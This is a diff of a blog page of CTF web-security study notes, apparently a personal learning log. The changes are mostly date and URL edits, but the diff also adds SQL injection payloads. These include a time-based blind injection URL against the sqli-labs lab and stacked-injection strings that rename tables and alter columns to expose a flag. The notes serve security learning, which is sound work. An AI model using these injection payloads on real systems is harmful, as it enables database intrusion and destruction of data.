@@ -10,7 +10,7 @@
   <meta name="description" content="为了就业方便，偶尔还是要学一学Web QAQ">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF——Web学习记录【长期更新】">
-<meta property="og:url" content="https://goodlunatic.github.io/2023/03/23/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/index.html">
+<meta property="og:url" content="https://goodlunatic.github.io/2023/03/24/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/index.html">
 <meta property="og:site_name" content="Lunatic&#39;s Workstation">
 <meta property="og:description" content="为了就业方便，偶尔还是要学一学Web QAQ">
 <meta property="og:locale" content="en_US">
@@ -19,8 +19,8 @@
 <meta property="og:image" content="https://image.3001.net/images/20180622/15295975099603.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20180622/15295975192117.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20180622/15295975369757.png!small">
-<meta property="article:published_time" content="2023-03-23T12:51:23.000Z">
-<meta property="article:modified_time" content="2023-03-23T13:28:28.447Z">
+<meta property="article:published_time" content="2023-03-24T01:51:23.000Z">
+<meta property="article:modified_time" content="2023-03-24T01:57:34.888Z">
 <meta property="article:author" content="Lunatic">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Web">
@@ -79,8 +79,8 @@
         <section id="main"><article id="post-CTF——Web学习记录【长期更新】" class="article article-type-post" itemscope
   itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2023/03/23/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" class="article-date">
-  <time datetime="2023-03-23T12:51:23.000Z" itemprop="datePublished">2023-03-23</time>
+    <a href="/2023/03/24/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" class="article-date">
+  <time datetime="2023-03-24T01:51:23.000Z" itemprop="datePublished">2023-03-24</time>
 </a>
     
   <div class="article-category">
@@ -182,7 +182,9 @@
 
 <h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-9/?<span class="built_in">id</span>=1<span class="string">&#x27; or if((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema =database() limit 0,1)=101,sleep(2),0) %23</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> databases;</span><br><span class="line"><span class="number">1</span>;<span class="keyword">show</span> tables;</span><br><span class="line"><span class="number">1</span>;<span class="keyword">show</span> columns <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> databases;</span><br><span class="line"><span class="number">1</span>;<span class="keyword">show</span> tables;</span><br><span class="line"><span class="number">1</span>;<span class="keyword">show</span> columns <span class="keyword">from</span> Flag</span><br><span class="line">#表名为数字时，要用反引号包起来查询</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span></span><br><span class="line"><span class="string">#1，通过 rename 先把 words 表改名为其他的表名。</span></span><br><span class="line"><span class="string">#2，把 1919810931114514 表的名字改为 words 。</span></span><br><span class="line"><span class="string">#3 ，给新 words 表添加新的列名 id 。</span></span><br><span class="line"><span class="string">#4，将 flag 改名为 data 。</span></span><br></pre></td></tr></table></figure>
 
 
 
@@ -524,7 +526,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://goodlunatic.github.io/2023/03/23/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" data-id="clfl5hk75000sv84p6dhng5uk" class="article-share-link">Share</a>
+      <a data-url="https://goodlunatic.github.io/2023/03/24/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" data-id="clflw7mge000hw44peolb5kiw" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
@@ -586,7 +588,7 @@
       <ul>
         
           <li>
-            <a href="/2023/03/23/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/">CTF——Web学习记录【长期更新】</a>
+            <a href="/2023/03/24/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/">CTF——Web学习记录【长期更新】</a>
           </li>
         
           <li>
